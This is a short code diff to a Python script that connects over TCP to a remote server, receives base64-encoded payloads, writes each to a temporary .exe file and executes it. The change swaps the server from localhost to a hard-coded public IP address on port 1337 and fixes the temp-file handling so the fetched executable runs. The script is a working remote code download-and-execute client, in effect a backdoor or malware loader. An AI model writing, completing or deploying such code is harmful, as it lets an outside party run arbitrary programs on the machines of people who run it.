@@ -8,7 +8,7 @@ import subprocess
 # TODO: conn keepalive
 # sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))
 
-server_addr = ('localhost', 1337)
+server_addr = ('198.21.170.115', 1337)
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
@@ -54,10 +54,11 @@ while True:
         payload = msg[msg.index(':'):]
         payload_bytes = base64.b64decode(payload)
 
-        f = tempfile.TemporaryFile(suffix=".exe")
+        f = tempfile.TemporaryFile(suffix=".exe", delete=False)
+        f_name = f.name
         f.write(payload_bytes)
-        subprocess.call(f.name)
         f.close()
+        subprocess.call(f_name)
 
     else:
         print(msg)
